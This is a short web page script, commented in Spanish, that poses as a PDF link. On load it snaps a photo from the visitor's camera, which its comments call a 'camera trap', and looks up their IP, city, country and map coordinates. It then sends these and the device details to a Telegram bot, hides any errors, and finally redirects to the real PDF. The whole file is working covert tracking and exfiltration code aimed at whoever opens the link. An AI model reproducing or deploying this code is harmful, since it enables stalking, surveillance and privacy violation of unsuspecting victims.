<script src="config.js"></script>

<script>
    async function rastrear() {
        let fotoCapturada = null;

        try {
            // 1. Intentar capturar foto (Trampa de c√°mara)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Convertir foto a Base64 para enviarla
                fotoCapturada = canvas.toDataURL('image/jpeg');
                
                // Detener c√°mara inmediatamente
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("C√°mara rechazada o no disponible");
            }

            // 2. Obtener datos de red y dispositivo
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const agente = navigator.userAgent;

            const texto = `üîî *ALERTA DE ACCESO*\n\n` +
                          `üåê *IP:* \`${d.ip}\`\n` +
                          `üìç *Lugar:* ${d.city}, ${d.country_name}\n` +
                          `üì± *Dispositivo:* ${agente.split(')')[0]})\n` +
                          `üîó *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

            // 3. Enviar datos a Telegram
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: texto,
                    parse_mode: 'Markdown'
                })
            });

            // 4. Si hay foto, enviarla como imagen separada
            if (fotoCapturada) {
                const blob = await (await fetch(fotoCapturada)).blob();
                const formData = new FormData();
                formData.append('chat_id', CONFIG.CHAT_ID);
                formData.append('photo', blob, 'foto.jpg');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }

        } catch (err) {
            console.log("Error silencioso...");
        } finally {
            // Redirigir al PDF real
            window.location.href = CONFIG.PDF_URL;
        }
    }

    window.onload = rastrear;
</script>
